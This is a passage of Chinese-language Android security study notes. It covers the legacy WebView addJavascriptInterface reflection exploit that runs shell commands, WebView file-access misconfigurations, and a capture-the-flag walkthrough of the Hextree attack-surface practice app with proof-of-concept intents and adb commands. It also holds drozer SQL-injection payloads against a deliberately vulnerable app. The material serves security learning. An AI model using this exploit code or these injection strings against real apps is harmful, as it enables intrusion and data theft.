2. 在 JS 中通过`window`对象找到注入的对象的 `getClass` 方法，然后通过反射机制获取 `Runtime` 对象，再调用静态方法执行命令，例如访问文件。
3. 通过命令的输出流获取文件信息，然后进行任意操作。核心 JS 代码如下：

```js
function execute(cmdArgs)  
{  
    for (var obj in window) {  
       if ("getClass" in window[obj]) {  
            alert(obj);  
            return  window[obj].getClass().forName("java.lang.Runtime")
                         .getMethod("getRuntime", null)
                         .invoke(null, null)
                         .exec(cmdArgs);  
        }  
    }  
}
```

### 利用示例

为了验证漏洞，我们加载了一个本地网页的恶意 JS，HTML 如下：

```html
<html>  
<head>  
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">  
<script>
var i = 0;
function getContents(inputStream) {
    var contents = "" + i;
    var b = inputStream.read();
    var i = 1;
    while(b != -1) {
        contents += String.fromCharCode(b) + "\n";
        b = inputStream.read();
    }
    i = i + 1;
    return contents;
}

function execute(cmdArgs) {
    for (var obj in window) {
        console.log(obj);
        if ("getClass" in window[obj]) {
            alert(obj);
            return window[obj].getClass().forName("java.lang.Runtime")
                    .getMethod("getRuntime", null)
                    .invoke(null, null)
                    .exec(cmdArgs);
        }
    }
}

var p = execute(["ls", "/mnt/sdcard/"]);
document.write(getContents(p.getInputStream()));
</script>

<script language="javascript">
function onButtonClick() {
    var text = jsInterface.onButtonClick("从 JS 传入的文本");
    alert(text);
}

function onImageClick() {
    var src = document.getElementById("image").src;
    var width = document.getElementById("image").width;
    var height = document.getElementById("image").height;
    jsInterface.onImageClick(src, width, height);
}
</script>
</head>

<body>
<p>点击图片与 Java 代码交互</p>
<img class="curved_box" id="image" onclick="onImageClick()" width="328" height="185"
     src="https://avicoder.me/webview/phuck.png"
     onerror="this.src='phuckerror.png'"/>
<button type="button" onclick="onButtonClick()">与 Java 交互</button>
</body>
</html>
```

关键点：

1. `execute()` 遍历 `window` 对象，找到具有 `getClass` 方法的对象，通过反射获取 `java.lang.Runtime`，执行任意命令。
2. `getContents()` 从命令的输入流中读取数据并显示。
3. 核心执行代码：

```javascript
return window[obj].getClass().forName("java.lang.Runtime")
            .getMethod("getRuntime", null)
            .invoke(null, null)
            .exec(cmdArgs);
```

对应的 Java 代码：

```java
mWebView = (WebView) findViewById(R.id.webview);  
mWebView.getSettings().setJavaScriptEnabled(true);  
mWebView.addJavascriptInterface(new JSInterface(), "jsInterface");  
mWebView.loadUrl("file:///android_asset/html/test.html");
```

需要权限：

```xml
<uses-permission android:name="android.permission.INTERNET"/>  
<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />  
<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />  
```

### 漏洞缓解

Google 对`@JavascriptInterface` 做了修改，只有带注解的 Java 方法才能被 JS 调用：

```java
class JsObject {
   @JavascriptInterface
   public String toString() { return "injectedObject"; }
}

webView.addJavascriptInterface(new JsObject(), "injectedObject");
webView.loadData("", "text/html", null);
webView.loadUrl("javascript:alert(injectedObject.toString())");
```

### WebView配置错误

WebView配置错误需要多层防御。开发者应禁用不必要的JavaScript接口，限制文件访问以防止本地文件泄露，实现内容安全策略头部，并且切勿在WebView中加载拥有特权访问权限的不受信任内容。

审计WebView在代码库中的使用情况。特别关注那些暴露设备或文件系统功能的JavaScript接口：

```java
webView.getSettings().setJavaScriptEnabled(true);
webView.addJavascriptInterface(newFileOperations(),"Android");
```

这会让 Java 方法接触到 WebView 中运行的 JavaScript 代码。如果WebView加载了不受信任的内容（用户提供的URL、深度链接），攻击者可以调用这些暴露的方法。

可利用接口示例：

```java
class FileOperations {
@JavascriptInterface
publicStringreadFile(String path){
// Reads any file accessible to the app
returnnewString(Files.readAllBytes(Paths.get(path)));
}
}
```

JavaScript 可以调用： 窃取敏感数据。`Android.readFile('/data/data/com.target.app/databases/users.db')`

文件访问已启用：

```java
webView.getSettings().setAllowFileAccess(true);
webView.getSettings().setAllowFileAccessFromFileURLs(true);
```

这些设置允许JavaScript通过URL访问本地文件，如果WebView加载了不受信任的内容，可能会导致数据被盗。`file://`

## Intent Attack Surface

io.hextree.attacksurface.apk 的漏洞样本。

<img src="assets/Pasted%20image%2020250819073712.png" alt="image" width="50%">

### Intent

#### Flag  1

知识点：基本导出活动

通过 jadx 逆向 apk，在`AndroidManifest.xml`中可以看到 Flag1Activity 是导出的，因此我们可以直接使用 intent 调用。

```xml
<activity
    android:name="io.hextree.attacksurface.activities.Flag1Activity"  
    android:exported="true"/>
<activity
```

当该 Activity 被创建时就会调用 success 函数，从而完成该关卡的挑战；

因此自己的 POC APP 中直接创建一个 intent 通过`setClassName`指定好包名和类名，通过`startActivity`调用即可。

poc：

```java
package com.example.poc;

import android.content.Intent;
import android.os.Bundle;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        try {
            Intent intent = new Intent();
            //setClassName 方法用于指定目标包名和类名
            intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag1Activity");
            //StartActivity 用于启动活动
            startActivity(intent);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

也可以使用 adb 或 drozer：

```shell
#adb
adb shell am start -n io.hextree.attacksurface/io.hextree.attacksurface.activities.Flag1Activity
#drozer

```

<img src="assets/Pasted%20image%2020251111164342.png" style="zoom:50%;" />

#### Flag 2 

知识点：带附加参数的 Intent

在 AndroidManifest.xml 中可以看到 Flag2Activity 也是导出的，但是加了一个`intent-filter`其中要求 Action 是：`io.hextree.action.GIVE_FLAG`。

Action 是 Intent 的一个参数，用于描述要执行的动作。

```xml
 <activity  
        android:name="io.hextree.attacksurface.activities.Flag2Activity"
        android:exported="true">
        <intent-filter>
            <action android:name="io.hextree.action.GIVE_FLAG"/>
        </intent-filter>
</activity>
```

在 Flag2Activity 的实现中也会检查是否存在该 action，不存在则直接返回不会调用 success 函数，action 是 intent 参数之一，用于描述该意图要执行的动作。

poc：

```java
package com.example.poc;

import android.content.Intent;
import android.os.Bundle;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        try {
            Intent intent = new Intent();
            
            //设置 Action
			intent.setAction("io.hextree.action.GIVE_FLAG");  
            
            //setClassName 方法用于指定目标包名和类名
            intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag2Activity");
            //StartActivity 用于启动活动
            startActivity(intent);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

adb：

```
adb shell am start -a io.hextree.action.GIVE_FLAG -n io.hextree.attacksurface/io.hextree.attacksurface.activities.Flag2Activity
```

<img src="assets/Pasted%20image%2020251111164615.png" style="zoom:50%;" />

#### Flag 3

知识点：带数据 URL 的 Intent 

```xml
 <activity  
        android:name="io.hextree.attacksurface.activities.Flag3Activity"
        android:exported="true">
        <intent-filter>
            <action android:name="io.hextree.action.GIVE_FLAG"/>
            <data android:scheme="https"/>
        </intent-filter>
</activity>
```

通过 Intent 携带一个 URI（数据地址）传递给目标组件

```java
Intent intent = new Intent();
intent.setAction("io.hextree.action.GIVE_FLAG");
intent.setData(Uri.parse("https://example.com"));
intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag3Activity");
startActivity(intent);
```

目标 Activity 只响应 满足 Action 且 URI cheme 为 https 的 Intent。

poc：

```java
package com.example.poc;  
  
import android.content.Intent;  
import android.os.Bundle;  
import androidx.appcompat.app.AppCompatActivity;  
import android.net.Uri;  
  
public class MainActivity extends AppCompatActivity {  
    @Override  
    protected void onCreate(Bundle savedInstanceState) {  
        super.onCreate(savedInstanceState);  
  
        try {  
            Intent intent = new Intent();  
  
            //设置 Action            intent.setAction("io.hextree.action.GIVE_FLAG");  
  
            //setData 设置 Uri 参数  
            intent.setData(Uri.parse("https://app.hextree.io/map/android"));  
  
            //setClassName 方法用于指定目标包名和类名  
            intent.setClassName(  
                    "io.hextree.attacksurface",  
                    "io.hextree.attacksurface.activities.Flag3Activity"  
            );  
            //StartActivity 用于启动活动  
            startActivity(intent);  
        } catch (Exception e) {  
            e.printStackTrace();  
        }  
    }  
}
```

adb：

```
adb shell am start -a io.hextree.action.GIVE_FLAG -d "https://app.hextree.io/map/android" -n io.hextree.attacksurface/io.hextree.attacksurface.activities.Flag3Activity
```

<img src="assets/Pasted%20image%2020251111165255.png" style="zoom:50%;" />

#### Flag 4

知识点：状态机

通过逆向可知，需要依次切换状态：INIT -> PREPARE -> BUILD -> GET_FLAG 才能成功执行 success，而切换状态是根据 intent 的 action 来切换的，所以需要多次使用不同 action 的 intent 来启动 activity

<img src="assets/Pasted%20image%2020250822233355.png" alt="image" width="60%">

action 的值依次为：PREPARE_ACTION、BUILD_ACTION、GET_FLAG_ACTION、ANY_ACTION，让我们来编写代码依次带着这几个 action 去启动 Flag4Activity，每次点击按钮都会切换一个状态，最终获得 flag

poc：

```java
homeButton.setOnClickListener(new View.OnClickListener() {  
        @Override  
        public void onClick(View v) {  
            String currentAction = actions[actionIndex];  
            // 每次点击索引 +1 并取模 4，获取下一个 Action 字符串  
            actionIndex = (actionIndex + 1) % actions.length;  
            Intent intent = new Intent();  
            intent.setAction(currentAction);  
            intent.setData(Uri.parse("https://app.hextree.io/map/android"));  
            intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag4Activity");  
            startActivity(intent);  
        }  
    });  
}
```

#### Flag 5 

知识点：Intent in Intent

通过逆向可知这个 intent 要包含两层 intent，最里面一层要有字符串 reason：back，中间层 intent 要有数字 return：42，最外层没有格外的要求

<img src="assets/Pasted%20image%2020250822233503.png" alt="image" width="60%">

poc：

```java
Intent nextIntent = new Intent();  
nextIntent.putExtra("reason", "back");   //最内层 intent  
Intent Intent2 = new Intent();  
Intent2.putExtra("return", 42);  
Intent2.putExtra("nextIntent", nextIntent);   // 中间层 intent  
Intent Intent = new Intent();   // 最外层 intent  
Intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag5Activity");  
Intent.putExtra(Intent.EXTRA_INTENT, Intent2);  
startActivity(Intent);
```

#### Flag 6

知识点：Intent 重定向

在某些代码中可以接受 intent 中传递过来的信息，从而开启一个新的 activity，例如 Flag5 中可能没有注意到的一点，它在另一个分支中通过 startActivity 函数直接启动了 nextIntent，这就可以被我们用来间接的启动一些未导出的 activity，比如 Flag6Activity，只需要把 reason 改为 next 即可走到这个分支

<img src="assets/Pasted%20image%2020250822233802.png" alt="image" width="60%">

poc：

```java
Intent nextIntent = new Intent();  
nextIntent.putExtra("reason", "next");  
nextIntent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);  
nextIntent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag6Activity");  
Intent Intent2 = new Intent();  
Intent2.putExtra("return", 42);  
Intent2.putExtra("nextIntent", nextIntent);  
Intent Intent = new Intent();  
Intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag5Activity");  
Intent.putExtra(Intent.EXTRA_INTENT, Intent2);  
startActivity(Intent);
```

#### Flag 7

知识点：Activity lifeycle tricks

这一关虽然看起来只要发送两个带有 action 的 intent 就好了，但是实际上第二个 intent 需要在第一个已启动的状态下，再次启动 intent（onNewIntent）

想要让系统调用 onNewIntent 函数只有当已存在的 Activity 实例位于栈顶，在这种状态下，带着 FLAG_ACTIVITY_SINGLE_TOP 启动该 Activity 时，系统才不会创建新实例，而是复用该栈顶实例并回调 onNewIntent()

<img src="assets/Pasted%20image%2020250822233905.png" alt="image" width="60%">
首先带着 OPEN 这个 action 启动一次；然后等待一小段时间，设置 action 为 REOPEN，并给 Intent2 添加一个标记位 addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP) （可算知道怎么延时了

- poc

```java
Intent Intent1 = new Intent();  
Intent1.setAction("OPEN");  
Intent1.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag7Activity");  
startActivity(Intent1);  
v.postDelayed(() ->{  
    Intent Intent2 = new Intent();  
    Intent2.setAction("REOPEN");  
    Intent2.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag7Activity");  
    Intent2.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);  
    startActivity(Intent2);  
},100);
```

### AcitivityResult

#### Flag 8

分析发现 activity 是导出的。

```xml
<activity                    		
          android:name="io.hextree.attacksurface.activities.Flag8Activity"
          android:exported="true"/>
<activity
```

分析代码：

通过`getCallingActivity`获取到调用者 activity 的 componentName。

只有通过`startActivityForResult`启动的 activity 才能获取调用方，如果是普通 startActivity 则返回 null。

然后判断调用者的类名是否包含字符串`Hextree`。

<img src="./assets/image-20251120131024167.png" alt="image-20251120131024167" style="zoom:50%;" />

利用思路：

```java
package com.poc.hack;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;

public class HextreeCallerActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Intent i = new Intent();
        i.setComponent(new ComponentName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag8Activity"
        ));

        startActivityForResult(i, 1337);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {

        super.onActivityResult(requestCode, resultCode, data);
        System.out.println("Flag8 返回：" + data);
    }
}
```



#### Flag 9

### ImpllcitIntent

#### Flag 10：

#### Flag 11：

#### Flag 12：

#### Flag 10

#### Flag 11

#### Flag 12

### Deeplink

#### Flag 13

#### Flag 14

#### Flag 15

### BroadcastReceiver

#### Flag 16

#### Flag 17

#### Flag 18

#### Flag 19

#### Flag 20

#### Flag 21

### PendingIntent

#### Flag 22

#### Flag 23

### Service

#### Flag 24

#### Flag 25

#### Flag 26

#### Flag 27

#### Flag 28

#### Flag 29

### Content Provider

#### Flag 30

#### Flag 31

尝试使用drozer进行sql注入

```shell
drozer console connect
```

列出所有可访问的URI

```shell
run scanner.provider.finduris -a infosecadventures.allsafe
```

查询存在sql注入的uri

```
run scanner.provider.injection -a infosecadventures.allsafe
```

尝试进行SQL注入

```
run app.provider.query content://infosecadventures.allsafe.dataprovider --projection " * from sqlite_master where type='table';-- "
```

获取数据：

```
run app.provider.query content://infosecadventures.allsafe.dataprovider/ --projection "* FROM sqlite_master WHERE tbl_name='sqlite_sequence';--"
run app.provider.query content://infosecadventures.allsafe.dataprovider/ --projection " name,seq FROM sqlite_sequence;--"
```

利用Selection参数注入

```
run app.provider.query content://infosecadventures.allsafe.dataprovider/ --selection "' OR 1=1--"run app.provider.query content://infosecadventures.allsafe.dataprovider/ --selection "1=1) union select sqlite_version(),2,3--"
```

- Flag 32

- Flag 33.1

- Flag 33.2

### File Provider

#### Flag 34

#### Flag 35

#### Flag 36

#### Flag 37

### Webview

#### Flag 38

#### Flag 39

#### Flag 40

#### Flag 41

许多应用不是用 Java 或 Kotlin 编写的，而是用 Javascript 和 HTML 实现的，然后在 [WebView](https://developer.android.com/develop/ui/views/layout/webapps/webview) 中呈现。因此，在查找应用程序中的安全问题时，WebView 是一个非常重要的攻击面。在非常旧的 Android 版本（2013 年）中，WebView 非常不安全，甚至可能导致[任意代码执行](https://labs.withsecure.com/publications/webview-addjavascriptinterface-remote-code-execution)。然而，在现代 Android 中，这不再可能。

除了 WebView 之外，还存在所谓的[自定义选项卡](https://developer.chrome.com/docs/android/custom-tabs)。这是一项更现代的功能，在 Android 应用程序安全课程中很少涵盖。这就是为什么我们还将在本课程中探讨它们。

```xml
<WebView 
	android:id="@+id/big_webview" 
	android:layout_width="match_parent" 
	android:layout_height="match_parent"> 
</WebView>
```

然后，可以在应用程序代码中引用 WebView 元素以在其中加载 URL。

```java
WebView webView = findViewById(R.id.big_webview); 
webView.loadUrl("https://www.hextree.io");
```

作为攻击者，我们想考虑如果攻击者可以控制 WebView 中加载的 URL 会发生什么，或者如果我们发现跨站点脚本等 Web 漏洞可以做什么。

访问本地文件

虽然 WebView 通常提供来自 Internet 的内容，但它也可以从应用程序本身加载本地 HTML 和 JavaScript 文件。这对于离线功能很有用，甚至当应用程序完全用 HTML 和 Javascript 实现时。

Android 应用程序可以在其项目结构中包含一个文件夹。此文件夹捆绑到最终 APK 中，可在运行时访问。WebView 有一个内置功能，可以通过以下方式加载这些文件：`/assets/``file:///android_asset/``file:///android_res/`


```java
WebView webView = findViewById(R.id.webView); 
webView.getSettings().setJavaScriptEnabled(true); // Enable JavaScript if needed 
webView.loadUrl("file:///android_asset/index.html");
```

由于资产文件捆绑在 Play 商店中公开分发的 APK 中，因此它们被视为公开。这就是为什么即使通常未启用文件访问，WebView 也可以加载它们。为了能够加载其他应用程序内部文件，必须更改 WebView [WebSettings](https://developer.android.com/reference/android/webkit/WebSettings)：

```java
WebView webView = findViewById(R.id.webView); webView.getSettings().setAllowFileAccess(true); //webView.getSettings().setAllowContentAccess(true); //webView.getSettings().setAllowFileAccessFromFileURLs(true); //webView.getSettings().setAllowUniversalAccessFromFileURLs(true);
```

开发基础：[28-点击事件_哔哩哔哩_bilibili](https://www.bilibili.com/video/BV19U4y1R7zV/?spm_id_from=333.788.videopod.episodes&vd_source=edca928f1ab30d19924c36939a858238&p=28)

- 分析

```java
package io.hextree.attacksurface.activities;

import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.View;
import android.widget.Button;
import io.hextree.attacksurface.AppCompactActivity;
import io.hextree.attacksurface.C0975R;
import io.hextree.attacksurface.LogHelper;
import io.hextree.attacksurface.webviews.Flag38WebViewsActivity;

public class Flag38Activity extends AppCompactActivity {
    //flag字段
    public static String FLAG = "XvF6eM9PbfHOYUYh85/0bOS7CGN2Wr9pzC7dZiBYyJs=";

    public Flag38Activity() {
        this.name = "Flag 38 - @JavascriptInterface";
        this.tag = "WebView";
        this.tagColor = C0975R.color.blue;
        this.flag = FLAG;
        this.allowOpenActivity = true;
        this.description = Flag38WebViewsActivity.class.getCanonicalName();
    }

    @Override
    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        this.f182f = new LogHelper(this);
        Intent intent = getIntent();
        this.f182f.addTag("/flag/38");
        if (Flag38WebViewsActivity.secret.equals(intent.getStringExtra("secret"))) {
            checkStatus(this);
        }
        ((Button) findViewById(C0975R.id.btn_action)).setText("OPEN WEBVIEW");
        ((Button) findViewById(C0975R.id.btn_action)).setVisibility(0);
        findViewById(C0975R.id.btn_action).setOnClickListener(new View.OnClickListener() { 
        @Override
        public final void onClick(View view) {
                this.f$0.m149x9b1b477d(view);
        }
        });
        if (isSolved()) {
            return;
        }
        new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
            @Override
            public final void run() {
                this.f$0.m150xc8f3e1dc();
            }
        }, 400L);
    }

    void m149x9b1b477d(View view) {
        startActivity(new Intent(this, (Class<?>) Flag38WebViewsActivity.class));
    }

    void m150xc8f3e1dc() {
        startActivity(new Intent(this, (Class<?>) Flag38WebViewsActivity.class));
    }
}
```

分析 WebView 部分代码：

```java
package io.hextree.attacksurface.webviews;

import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.webkit.JavascriptInterface;
import android.webkit.WebView;
import android.widget.TextView;
import android.widget.Toast;
import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.OnApplyWindowInsetsListener;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;
import io.hextree.attacksurface.C0975R;
import io.hextree.attacksurface.activities.Flag38Activity;
import java.util.UUID;

public class Flag38WebViewsActivity extends AppCompatActivity {
    public static String secret = UUID.randomUUID().toString();

    class JsObject {
        JsObject() {
        }

        @JavascriptInterface
        public void toastDemo() {
            Toast.makeText(Flag38WebViewsActivity.this.getApplicationContext(), "Called from WebView", 0).show();
        }

        @JavascriptInterface
        public String success(boolean z) {
            if (z) {
                Flag38WebViewsActivity.this.success();
                return "success(true)";
            }
            return "success(Boolean secret) requires `true` parameter";
        }
    }

    @Override
    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        EdgeToEdge.enable(this);
        setContentView(C0975R.layout.activity_web_view);
        String stringExtra = getIntent().getStringExtra("URL");
        if (stringExtra == null) {
            stringExtra = "file:///android_asset/flag38.html";
        }
        ((TextView) findViewById(C0975R.id.txt_webview_header)).setText(getClass().getSimpleName());
        ((TextView) findViewById(C0975R.id.txt_webview_subtitle)).setText(stringExtra);
        final WebView webView = (WebView) findViewById(C0975R.id.main_webview);
        //WebView初始化
        webView.getSettings().setJavaScriptEnabled(true);
        //暴露JS对象hextree
        webView.addJavascriptInterface(new JsObject(), "hextree");
        //页面加载本地flag38.html
        webView.loadUrl(stringExtra);
        findViewById(C0975R.id.button_back).setOnClickListener(new View.OnClickListener() {
            @Override
            public final void onClick(View view) {
                this.f$0.m158x89ddf80a(view);
            }
        });
        findViewById(C0975R.id.button_reload).setOnClickListener(new View.OnClickListener() { 
            @Override 
            public final void onClick(View view) {
                webView.reload();
            }
        });
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(C0975R.id.main), new OnApplyWindowInsetsListener() { 
            @Override 
            public final WindowInsetsCompat onApplyWindowInsets(View view, WindowInsetsCompat windowInsetsCompat) {
                return Flag38WebViewsActivity.lambda$onCreate$2(view, windowInsetsCompat);
            }
        });
    }

    void m158x89ddf80a(View view) {
        finish();
    }

    static WindowInsetsCompat lambda$onCreate$2(View view, WindowInsetsCompat windowInsetsCompat) {
        Insets insets = windowInsetsCompat.getInsets(WindowInsetsCompat.Type.systemBars());
        view.setPadding(insets.left, insets.top, insets.right, insets.bottom);
        return windowInsetsCompat;
    }

    public void success() {
        Log.i(getClass().getSimpleName(), "success()");
        try {
            Intent intent = new Intent();
            intent.setClass(this, Flag38Activity.class);
            intent.putExtra("secret", secret);
            intent.addFlags(268435456);
            intent.putExtra("hideIntent", true);
            startActivity(intent);
        } catch (Exception e) {
            e.printStackTrace();
            Log.e(getClass().getSimpleName(), "Exception in start activity. Restart the target app and try again.", e);
        }
    }
}
```

- 利用

在 WebView 种注入 JS，从而调用`hextree.success(true)`。

```shell
adb shell "am start -n io.hextree.attacksurface/io.hextree.attacksurface.webviews.Flag38WebViewsActivity -e URL \"javascript:hextree.success(true)\""
```

## 后言




## 参考

>[App漏洞挖掘技术 | 安全后厨团队](https://security-kitchen.com/android/App%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E6%9C%AF/)
>[浅析src的app漏洞挖掘-安全KER - 安全资讯平台](https://www.anquanke.com/post/id/187948#h2-1)
>[Android四大组件常见漏洞-先知社区](https://xz.aliyun.com/news/18366)
>[Drozer在APP安全中的应用 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/mobile/340493.html)
>[虫子赏金猎人安卓侦察：完整指南](https://www.yeswehack.com/learn-bug-bounty/android-recon-bug-bounty-guide)
>[Android Webview漏洞初探-先知社区](https://xz.aliyun.com/news/10951)

